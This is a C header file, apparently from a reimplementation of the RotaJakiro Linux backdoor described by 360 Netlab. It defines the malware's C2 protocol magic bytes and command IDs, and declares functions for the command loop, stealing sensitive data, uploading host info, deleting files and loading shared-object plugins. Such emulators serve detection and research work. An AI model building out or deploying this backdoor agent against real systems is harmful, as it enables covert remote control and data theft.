/**
 *@file c2_commands.h
 *
 *@bref This file contains prototypes for the c2 command functions
 * implemented by the "RotaJakiro" (rota) Linux malware documented by 360 Netlab
 *
 *@references
 * - https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
 * - https://blog.netlab.360.com/rotajakiro_linux_version_of_oceanlotus/
 **/

#ifndef C2_COMMANDS_H_
#define C2_COMMANDS_H_

#include <stdbool.h>

//RotaJakiro Magic Headers
const static unsigned char magicBytes[] = {0x3B, 0x91, 0x01, 0x10};
const static unsigned char initialBytes[] = {0x21, 0x70, 0x27, 0x20};
const static unsigned char sessionId[] = {0x01, 0x02, 0x03, 0x04};
const static unsigned char payloadLen[] = {0x0f};
const static unsigned char keyLen[] = {0x00,0x00};
const static unsigned char cmd_id[] = {0x00, 0x00, 0x00, 0x00};
const static unsigned char marker_1[] = {0xc2, 0x00};
const static unsigned char marker_2[] = {0xe2, 0x00};
const static unsigned char marker_3[] = {0xc2, 0x00};
const static unsigned char marker_4[] = {0xff,0x00};

// RotaJakiro Command IDs
// Taken from https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/
const static unsigned char rota_c2_exit[4] = {0x13, 0x8e, 0x3e, 0x06};
const static unsigned char rota_c2_heartbeat[4] = {0x5c, 0xca, 0x72, 0x07};
const static unsigned char rota_c2_set_timeout[4] = {0x17,0xB1, 0xCC, 0x04};
const static unsigned char rota_c2_steal_data[4] = {0x25, 0x36, 0x60, 0xEA};
const static unsigned char rota_c2_upload_dev_info[4] = {0x18, 0x32, 0x0e, 0x00};
const static unsigned char rota_c2_upload_file[4] = {0x2E, 0x25, 0x99, 0x02};
const static unsigned char rota_c2_query_file[4] = {0x2C, 0xD9, 0x07, 0x00};
const static unsigned char rota_c2_delete_file[4] = {0x12, 0xB3, 0x62, 0x09};
const static unsigned char rota_c2_run_plugin_1[4] = {0x1B, 0x25, 0x50, 0x30};


/**
 * @brief main c2 loop to process commands from handler
 * @param N/A
 * @return N/A
 * */
void c2_loop();

/**
* @brief exit and kill rota via command-id 0x138E3E6
* @param char * for command if to pass back to the C2 server
* @param  file descriptor for socket to close
*
*/
void c2_exit(char *cmd_id, int sock2);


/**
* @brief ping/pong between handler and agent command-id: 0x5CCA727
* @params char * to cmd_id, integer value for socket
* @return N/A
**/
void c2_heartbeat(char *cmd_id, int sock);

/**
* @brief update the c2 call back time command-id 0x17B1CC4
* @param integer indicating how long to sleep for.
*
* @return N/A
**/
void c2_set_timeout(int *sleeptime, int newTime);

/**
* @brief obtain sensitive info (TODO - what sensitive info) from host machine command-id: 0x25360EA
* @return: a char * to encrypted and compressed data stolen
*/
char *c2_steal_sensitive_info();

/**
* @brief obtain information from uname output command-id: 0x18320e0
* @param cahr *buffer to populate.
* @return N/A
*/
void c2_upload_device_info(char *buffer);

/**
* @brief check for the existance of a given file/plugin on the file system 0x2CD9070
* @param fpath file to check exists.
* @return true a file exists, false it does not.
*
*/
bool c2_query_file(char *fpath);


/**
* @brief delete a file/plugin given a specific file path. 0x12B3629
* @param char* of filepath to delete.
* @return boolean indicating success/failure of deleting a file
**/
bool c2_delete_file(char *fpath);

/**
 * @brief Load and run a SO as a "plugin" command-id 0x1B25503
 * @note no public threat intelligence exists about the contents of the plugins executed.
 * @param soPath, char * pointing to file to load
 * @param funcName, char * for exported function
 *
 * @return N/A
 **/
void c2_run_plugin_1(char *soPath, char *funcName);


/**
 * @brief prepare initial pkt to send to destination host.
 * @param N/A
 * @return char pointer to ROTA's initial header.
 **/
char *initial_rota_pkt();

/**
 * @brief Parse C2 pkt to obtain cmd id
 * @param char * to buffer to parse
 * @return char value of command id
 **/
char *parse_c2_cmdid(char *buffer);

/**
 * @brief Parse C2 pkt to obtain payload length
 * @param char * to buffer to parse
 * @return interger value of payload length
 **/
int parse_c2_payload_len(char *buffer);

/**
 * @brief Parse C2 pkt to obtain payload
 * @param char * to buffer to parse
 * @return char * containing payload
 **/
char *parse_c2_payload(char *buffer, int length);


/**
*@brief populate char buffer to send back to C2 server
*@param char bufffer for "PAYLOAD" section
*@return N/A
*/
void build_c2_response(char *buffer, char *cmd_id, int sock);



#endif // C2_COMMANDS_H_
